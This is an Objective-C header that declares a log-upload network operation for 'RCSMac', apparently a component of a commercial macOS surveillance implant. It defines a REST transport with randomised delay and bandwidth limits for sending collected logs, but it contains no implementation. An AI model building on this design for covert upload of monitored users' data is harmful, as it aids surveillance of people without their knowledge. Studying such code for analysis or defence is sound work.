/*
 * RCSMac - Log Upload Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

//#import <Cocoa/Cocoa.h>
#import "NetworkOperation.h"
#import "RESTTransport.h"


@interface LogNetworkOperation : NSObject <NetworkOperation>
{
@private
  RESTTransport *mTransport;

@private
  uint32_t mMinDelay;
  uint32_t mMaxDelay;
  uint32_t mBandwidthLimit;
}

- (id)initWithTransport: (RESTTransport *)aTransport
               minDelay: (uint32_t)aMinDelay
               maxDelay: (uint32_t)aMaxDelay
              bandwidth: (uint32_t)aBandwidth;
- (void)dealloc;

@end
